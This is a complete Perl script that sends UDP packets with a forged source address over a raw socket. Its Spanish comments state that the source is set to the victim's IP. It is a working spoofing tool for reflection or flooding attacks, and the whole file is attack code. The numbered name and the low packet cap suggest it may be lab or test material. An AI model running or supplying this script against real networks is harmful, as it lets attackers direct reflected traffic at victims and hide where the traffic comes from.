#!/usr/bin/perl
# ATA054_spoofer.pl — envia peticiones UDP con FUENTE FALSIFICADA (raw socket).
# Uso: spoofer.pl <src_ip> <src_port> <dst_ip> <dst_port> <count> <payload_bytes>
# Requiere root (SOCK_RAW + IP_HDRINCL). Fuente = IP de la victima (spoofing).
use strict;
use warnings;
use Socket;

my ($src, $sport, $dst, $dport, $count, $plen) = @ARGV;
$count //= 25;
$plen  //= 16;
$count = 40 if $count > 40;

socket(my $s, AF_INET, SOCK_RAW, 17) or die "socket raw (root?): $!";
setsockopt($s, 0, 3, pack("i", 1)) or die "IP_HDRINCL: $!";   # IPPROTO_IP=0, IP_HDRINCL=3

my $payload = "S" x $plen;
my $enviados = 0;
for (my $i = 0; $i < $count; $i++) {
    my $totlen = 20 + 8 + length($payload);
    # cabecera IP (20 B): v/ihl, tos, totlen, id, flags/frag, ttl, proto, csum, src, dst
    my $ip = pack("CCnnnCCn", 0x45, 0, $totlen, 0, 0, 64, 17, 0)
           . inet_aton($src) . inet_aton($dst);
    # cabecera UDP (8 B): sport, dport, len, csum(=0 -> kernel)
    my $udp = pack("nnnn", $sport, $dport, 8 + length($payload), 0) . $payload;
    if (send($s, $ip . $udp, 0, sockaddr_in($dport, inet_aton($dst)))) {
        $enviados++;
    } else {
        warn "send: $!";
    }
    select(undef, undef, undef, 0.02);
}
print "spoofer: requests_enviados=$enviados payload_bytes=", $enviados * length($payload),
      " src=$src:$sport dst=$dst:$dport\n";
